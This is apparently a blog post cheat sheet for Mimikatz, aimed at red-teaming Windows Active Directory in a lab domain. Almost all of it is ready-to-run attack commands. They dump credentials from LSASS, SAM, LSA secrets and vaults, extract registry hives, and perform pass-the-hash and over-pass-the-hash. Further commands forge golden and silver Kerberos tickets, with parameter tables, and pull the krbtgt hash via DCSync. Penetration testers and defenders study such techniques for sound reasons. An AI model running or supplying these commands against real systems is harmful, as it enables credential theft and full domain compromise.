---
title: Mimikatz cheatsheet
subtitle: Mimikatz is an open-source application that allows users to view and save authentication credentials such as Kerberos tickets. The toolset works with the current release of Windows and includes a collection of different network attacks to help assess vulnerabilities.

# Summary for listings and search engines
summary: Mimikatz is an open-source application that allows users to view and save authentication credentials such as Kerberos tickets. The toolset works with the current release of Windows and includes a collection of different network attacks to help assess vulnerabilities.

# Link this post with a project
projects: []

# Date published
date: '2022-08-07T00:00:00Z'

# Date updated
lastmod: '2022-08-07T00:00:00Z'

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Giovanni Pecoraro**](https://unsplash.com/photos/CpkOjOcXdUY)'
  focal_point: ''
  placement: 2
  preview_only: false

authors:
  - admin

tags:
  - Red Teaming
  - Windows
  - Active Directory
  - Mimikatz
  
categories:
  - Cyber Security

---

## Basic commands

Dump credentials on a local machine (needs local administrator rights):

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds

Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords"'	# Cached passwords

Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'	# SAM database passwords
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'	# LSA secrets
Invoke-Mimikatz -Command '"token::elevate" "lsadump::cache"'	# Cached credentials
```

```batch
:: mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::logonpasswords

mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache

mimikatz # vault::list
mimikatz # vault::cred
mimikatz # vault::cred /patch
```

Dump credentials on multiple remote machines (needs administrator rights on remote machines):

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds -ComputerName @("COMPUTER1", "COMPUTER2") 
```

ERROR *kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061*: The required privilege is not held by the client (mostly you're not an administrator).

ERROR *kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)*: No rights to access the LSASS process.

Extract in-memory credentials from a minidump of a local machine (needs local administrator rights):

```batch
:: procdump.exe
:: On the remote machine (needs local admin rights) 
.\procdump.exe -accepteula -ma lsass.exe c:\users\public\dump.dmp 2>&1

:: mimikatz.exe
:: On the local machine after the reception of the minidump file dump.dmp
mimikatz # sekurlsa::minidump dump.dmp
mimikatz # sekurlsa::logonpasswords
```

Extract SAM credentials from a local machine without Mimikatz (needs local administrator rights):

```batch
:: procdump.exe
:: On the remote machine (needs local admin rights) 
reg save hklm\system SYSTEM.sav
reg save hklm\sam SAM.sav
reg save hklm\security SECURITY.sav

Invoke-Mimikatz -Command '"lsadump::sam /sam:SAM.sav /system:SYSTEM.sav"'
```

or:

```bash
# Impacket
# On a local kali machine
impacket-secretsdump -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
```

Extract tickets relative to all users on a machine:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

Inject the ticket of interest in the current user session:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt [0;82f8f7]-2-0-60a10000-dbprodadmin@krbtgt-US.FUNCORP.LOCAL.kirbi"' }
```

Execute mimikatz to get krbtgt hash (must be specified DC as ComputerName and requires Domain Admin privileges):

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName "cyberlab-dc.cyberlab.cybercorp.local"
```

```batch
:: mimikatz.exe
:: To be executed on domain controller
mimikatz # lsadump::lsa /patch
```

## Pass-the-Hash

"Pass-the-Hash" inject a hash for a machine local administrator (needs local administrator rights). Once you get the NTLM hash of the RID 500 remote machine Administrator it is possible to inject it into a session:

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

```batch
:: mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe
mimikatz # sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe
```

and the open a SYSTEM shell by `psexec`:

```batch
psexec.exe \\COMPUTER1 cmd
```

## Over-Pass-the-Hash

"Over-Pass-the-Hash" generate tokens from hashes (needs local administrator rights):

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe"'
```

```batch
:: mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe
```

## Golden Ticket

Generate a TGT encripted with krbtgt hash valid for every user:

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt"'
```

```batch
:: mimikatz.exe
mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt
```

**Golden Ticket Parameters**

| Parameter	| Optional| Description |
| ---- | ---- | ---- |
| **/user**	| No    | Username for which the TGT is generated |
| **/domain**	| No	| Domain FQDN |
| **/sid**	| No	| SID of the domain |
| **/krbtgt**	| No	| NTLM (RC4) hash of the krbtgt account. Use **/aes128** and **/aes256** for using AES keys |
| **/sids**	| Yes	| Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-[DOMAIN_ID]-519”. This parameter adds the provided SIDs to the SID History parameter. |
| /id		| Yes	| User RID (default 500) |
| /groups	| Yes	| Group RID (default 513 512 520 518 519) |
| /startoffset	| Yes	| When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin	| Yes	| Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax	| Yes	| Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |
| **/ptt**	| 	| Injects the ticket into the current PowerShell process (no need to save the ticket on disk) |
|/ticket	|	| Saves the ticket to a file for later use |

---

**Golden Ticket Default Groups**

| Group	| SID |
| ---- | ---- |
| Domain Users		| S-1-5-21-[DOMAIN_ID]-513	|
| Domain Admins		| S-1-5-21-[DOMAIN_ID]-512	|
| Schema Admins		| S-1-5-21-[DOMAIN_ID]-518	|
| Enterprise Admins*	| S-1-5-21-[DOMAIN_ID]-519	|
| Group Policy Creator Owners | S-1-5-21-[DOMAIN_ID]-520|

*This is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights.

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /krbtgt:2e7a862b21d4afaeb8e0eb57a350b523 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
```batch
:: mimikatz.exe
mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /krbtgt:2e7a862b21d4afaeb8e0eb57a350b523 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

Import a previously created ticket:

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

```batch
:: mimikatz.exe
mimikatz # kerberos::ptt ticket.kirbi
```

## Silver Ticket

Generate a TGS encripted with a MACHINE$ account hash valid for its services:

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /rc4:[TARGET_MACHINE_NTLM_HASH] /target:[TARGET_MACHINE_FQDN] /service:[TARGET_MACHINE_SERVICE] /ptt"'
```
```batch
:: mimikatz.exe
mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /rc4:[TARGET_MACHINE_NTLM_HASH] /target:[TARGET_MACHINE_FQDN] /service:[TARGET_MACHINE_SERVICE] /ptt
```

**Silver Ticket Parameters**

| Parameter | Optional | Description |
| -------| ------- | ------- |
| **/user**	| No    | Username for which the TGT is generated |
| **/domain**	| No	| Domain FQDN |
| **/sid**	| No	| SID of the domain |
| **/rc4**	| No	| NTLM (RC4) hash of the krbtgt account. Use **/aes128** and **/aes256** for using AES keys |
| **/target**	| No	| Target server FQDN |
| **/service**	| No	| Service Principal Name class of the Kerberos service running on target |
| /id		| Yes	| User RID (default 500) |
| /groups	| Yes	| Group RID (default 513 512 520 518 519) |
| /startoffset	| Yes	| When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin	| Yes	| Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax	| Yes	| Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |
| **/ptt**	| 	| Injects the ticket into the current PowerShell process (no need to save the ticket on disk) |
|/ticket	|	| Saves the ticket to a file for later use |

---

**Silver Ticket Services**

| Service Type | Required Silver Tickets Services |
| ------- | ------- |
| WMI	       		| HOST, RPCSS|
| PowerShell Remoting	| HOST, HTTP, WSMAN (only some OS), RPCSS (only some OS)|
| WinRM			| HOST, HTTP|
| Scheduled Tasks	| HOST|
| Windows File Shares	| CIFS|
| LDAP (Includes DCSync)| LDAP|
| Windows Remote Server Administration Tools| RPCSS, LDAP, CIFS |

---

**Silver Ticket Default Groups**

| Group	| SID |
| ---- | ---- |
| Domain Users		| S-1-5-21-[DOMAIN_ID]-513	|
| Domain Admins		| S-1-5-21-[DOMAIN_ID]-512	|
| Schema Admins		| S-1-5-21-[DOMAIN_ID]-518	|
| Enterprise Admins*	| S-1-5-21-[DOMAIN_ID]-519	|
| Group Policy Creator Owners | S-1-5-21-[DOMAIN_ID]-520|

*This is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights.

In order to enable PowerShell Remoting the Silver Tickets for HOST, HTTP, WSMAN and RPCSS must be generated:

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HOST /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HTTP /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:WSMAN /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:RPCSS /ptt"'
```

```batch
:: mimikatz.exe
mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HOST /ptt
mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HTTP /ptt
mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:WSMAN /ptt
mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:RPCSS /ptt
```

Import a previously created ticket:

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

```batch
:: mimikatz.exe
mimikatz # kerberos::ptt ticket.kirbi
```

## DCSync

Use the DCSync feature to get krbtgt hash (requires DCSync privileges):

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberlab\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberlab\krbtgt /domain:cyberlab.local"'	
```

```batch
:: mimikatz.exe
mimikatz # lsadump::dcsync /user:cyberlab\krbtgt
mimikatz # lsadump::dcsync /user:cyberlab\krbtgt /domain:cyberlab.local
```
---